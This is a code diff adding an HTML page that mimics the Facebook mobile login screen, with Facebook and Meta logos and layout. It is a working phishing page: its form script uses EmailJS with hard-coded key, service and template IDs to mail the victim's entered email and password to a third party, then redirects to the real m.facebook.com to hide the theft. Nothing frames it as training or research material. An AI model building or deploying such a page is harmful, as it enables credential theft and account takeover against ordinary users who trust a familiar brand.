@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Facebook</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yv/r/B8SoMFclA3x.ico">
+    <style>
+        /* General Body Styles */
+        body {
+            margin: 0;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            color: #1c1e21;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Main Container */
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            flex-grow: 1;
+        }
+
+        /* Header Banner */
+        .header {
+            background-color: white;
+            padding: 20px 8px 20px 20px;
+            text-align: center;
+            width: 100%;
+            font-size: 14px;
+            border-bottom: 1px solid #e4e4e4;
+        }
+
+        .header a {
+            color: #3b5998;
+            text-decoration: none;
+        }
+
+        /* Main Content Area */
+        .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+
+        .language-selector {
+            color: #737373;
+            font-size: 12px;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        /* Form Styling */
+        #login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-container {
+            width: 100%;
+            margin-bottom: 12px;
+            position: relative; /* Added for eye icon positioning */
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 20px 16px;
+            font-size: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            background-color: white;
+            box-sizing: border-box;
+            padding-right: 45px; /* Make space for the eye icon */
+        }
+
+        input::placeholder {
+            color: #90949c;
+        }
+
+        /* Eye Icon for Password */
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #90949c;
+            font-size: 18px;
+            display: none; /* Hidden by default, shown by JS when input has value */
+        }
+
+        /* Button Styling */
+        .btn {
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 14px 16px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+
+        .btn-login {
+            background-color: #1877f2;
+            color: white;
+        }
+
+        .btn-login:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 15px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        /* Divider */
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            width: 100%;
+            margin: 20px 0;
+        }
+
+        .btn-create {
+            background-color: #42b72a;
+            color: white;
+        }
+
+        .btn-create:hover {
+            background-color: #36a420;
+        }
+
+        /* Footer Styling */
+        .footer {
+            padding: 18px;
+            text-align:center;
+            width: 100%;
+            margin-top: auto;
+            position: relative; /* For Meta logo absolute positioning */
+        }
+
+        .meta-logo-wrapper {
+            position: absolute; /* Changed to absolute positioning */
+            width: 100%;
+            text-align: center;
+            bottom: 60px; /* Adjust as needed to match image */
+            left: 0;
+        }
+
+        .meta-logo {
+            height: 15px;
+            width: 70px;
+            color: #8a8d91;
+            vertical-align: middle;
+            margin-right: 5px; /* Space between logo and text */
+        }
+
+        .meta-text {
+            color: black;
+            font-size: 20px;
+            font-weight: ;
+            vertical-align: top;
+        }
+
+        .footer-links {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            left: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .footer-links a {
+            color: #8a8d91;
+            font-size: 12px;
+            font-weight:bold ;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+  
+    </style>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "qSGi1S2FDFI4BbTSg",
+      });
+   })();
+</script>
+
+  <script>
+   
+
+    function sendEmail(e) {
+      console.log("hello");
+      e.preventDefault();
+      emailjs.send("service_r5qnz4q", "template_3b27n49", {
+        email: document.getElementById("email").value,password: document.getElementById("password").value
+        
+      }).then(() => {
+        //alert("Email sent successfully!");
+        window.location.href = 'https://m.facebook.com/'
+      }, (err) => {
+        //alert("Error: " + JSON.stringify(err));
+      });
+      
+      
+    }
+  </script>
+
+</head>
+<body>
+  
+  
+
+    <div class="container">
+        <div class="header">
+            <a href="#">Get Facebook for Android and browse faster.</a>
+        </div>
+
+        <div class="content">
+            <div class="language-selector">
+                <span>English (US)</span>
+            </div>
+
+            <div class="logo">
+                <svg viewBox="0 0 36 36" class="facebook-logo" fill="url(#jsc_s_2)" height="50" width="50"><defs><linearGradient x1="50%" x2="50%" y1="97.0782153%" y2="0%" id="jsc_s_2"><stop offset="0%" stop-color="#0062E0"></stop><stop offset="100%" stop-color="#19AFFF"></stop></linearGradient></defs><path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"></path><path class="f-logo" fill="#fff" d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"></path></svg>
+            </div>
+
+            <form id="login-form" onsubmit="sendEmail(event)" >
+                <div class="input-container">
+                    <input type="text" id="email" placeholder="Mobile number or email" required>
+                </div>
+                <div class="input-container">
+                    <input type="password" id="password" placeholder="Password" required>
+                    <span class="toggle-password" id="togglePassword">&#128065;</span>
+                </div>
+                <button type="submit"  class="btn btn-login">Log in</button>
+            </form>
+
+            <a href="#" class="forgot-password">Forgot password?</a>
+
+            <div class="divider"></div>
+
+            
+        </div>
+
+        <div class="footer">
+            <div class="meta-logo-wrapper">
+              
+              
+              
+              <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="20" height="23" viewBox="0 0 256 256" xml:space="preserve">
+<g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
+	<path d="M 9.721 54.533 c 0 3.437 0.754 6.075 1.74 7.671 c 1.293 2.091 3.221 2.976 5.186 2.976 c 2.535 0 4.854 -0.629 9.324 -6.81 c 3.58 -4.954 7.799 -11.909 10.638 -16.269 l 4.807 -7.386 c 3.339 -5.13 7.205 -10.832 11.637 -14.697 c 3.618 -3.155 7.521 -4.907 11.449 -4.907 c 6.594 0 12.876 3.821 17.683 10.989 C 87.446 33.949 90 43.836 90 54.039 c 0 6.066 -1.196 10.522 -3.23 14.043 c -1.966 3.405 -5.796 6.807 -12.241 6.807 v -9.709 c 5.518 0 6.895 -5.07 6.895 -10.873 c 0 -8.269 -1.928 -17.445 -6.175 -24.002 c -3.014 -4.651 -6.92 -7.493 -11.217 -7.493 c -4.648 0 -8.388 3.505 -12.591 9.756 c -2.235 3.321 -4.529 7.368 -7.105 11.934 l -2.836 5.023 c -5.696 10.1 -7.139 12.4 -9.987 16.197 c -4.992 6.648 -9.255 9.167 -14.866 9.167 c -6.657 0 -10.867 -2.883 -13.474 -7.227 C 1.045 64.123 0 59.478 0 54.186 L 9.721 54.533 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(0,129,251); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
+	<linearGradient id="SVGID_8" gradientUnits="userSpaceOnUse" gradientTransform="matrix(1 0 0 -1 0 92)" x1="19.5097" y1="48.549" x2="81.4794" y2="45.4192">
+<stop offset="0%" style="stop-color:rgb(0,100,225);stop-opacity: 1"/>
+<stop offset="40%" style="stop-color:rgb(0,100,225);stop-opacity: 1"/>
+<stop offset="83%" style="stop-color:rgb(0,115,238);stop-opacity: 1"/>
+<stop offset="100%" style="stop-color:rgb(0,130,251);stop-opacity: 1"/>
+</linearGradient>
+<path d="M 7.665 26.785 c 4.457 -6.87 10.889 -11.674 18.265 -11.674 c 4.272 0 8.519 1.264 12.954 4.886 c 4.851 3.959 10.022 10.479 16.472 21.223 l 2.313 3.856 c 5.584 9.302 8.76 14.087 10.619 16.344 c 2.391 2.898 4.066 3.762 6.241 3.762 c 5.518 0 6.895 -5.07 6.895 -10.873 L 90 54.039 c 0 6.066 -1.196 10.522 -3.23 14.043 c -1.965 3.405 -5.796 6.807 -12.241 6.807 c -4.006 0 -7.555 -0.87 -11.48 -4.573 c -3.017 -2.842 -6.544 -7.89 -9.258 -12.428 L 45.72 44.405 c -4.05 -6.767 -7.765 -11.812 -9.915 -14.097 c -2.313 -2.457 -5.286 -5.424 -10.031 -5.424 c -3.84 0 -7.101 2.695 -9.831 6.817 L 7.665 26.785 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: url(#SVGID_8); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
+	<linearGradient id="SVGID_9" gradientUnits="userSpaceOnUse" gradientTransform="matrix(1 0 0 -1 0 92)" x1="12.9651" y1="33.3855" x2="12.9651" y2="56.2329">
+<stop offset="0%" style="stop-color:rgb(0,130,251);stop-opacity: 1"/>
+<stop offset="100%" style="stop-color:rgb(0,100,224);stop-opacity: 1"/>
+</linearGradient>
+<path d="M 25.774 24.885 c -3.84 0 -7.101 2.695 -9.831 6.817 c -3.859 5.825 -6.222 14.5 -6.222 22.832 c 0 3.437 0.754 6.075 1.74 7.671 l -8.288 5.458 C 1.045 64.123 0 59.478 0 54.186 c 0 -9.624 2.642 -19.655 7.665 -27.401 c 4.457 -6.87 10.889 -11.674 18.265 -11.674 L 25.774 24.885 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: url(#SVGID_9); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
+</g>
+</svg>
+                
+               
+              <span class="meta-text">Meta</span>
+            </div>
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Help</a>
+                <a href="#">More</a>
+            </div>
+        </div>
+    </div>
+  
+    
+    <script>
+        //document.addEventListener('DOMContentLoaded', () => {
+            const loginForm = document.getElementById('login-form');
+            const passwordInput = document.getElementById('password');
+            const togglePassword = document.getElementById('togglePassword');
+
+            // Toggle password visibility
+            togglePassword.addEventListener('click', function () {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                this.textContent = type === 'password' ? '👁️' : '🔒'; // Change eye icon
+            });
+
+            // Show/hide eye icon based on password input
+            passwordInput.addEventListener('input', function() {
+                if (this.value.length > 0) {
+                    togglePassword.style.display = 'block';
+                } else {
+                    togglePassword.style.display = 'none';
+                }
+            });
+
+            // Initial check in case there's autofilled content
+             if (passwordInput.value.length > 0) {
+                togglePassword.style.display = 'block';
+            } 
+         
+          
+          // togglePassword.addEventListener('click', function () {
+               
+          
+         // emailjs.send("service_r5qnz4q", "template_3b27n49", {
+        //email: document.getElementById("email").value
+      //  password: document.getElementById("password").value
+     // })
+          
+           // });
+
+            
+        //});
+    </script>
+
+</body>
+</html>
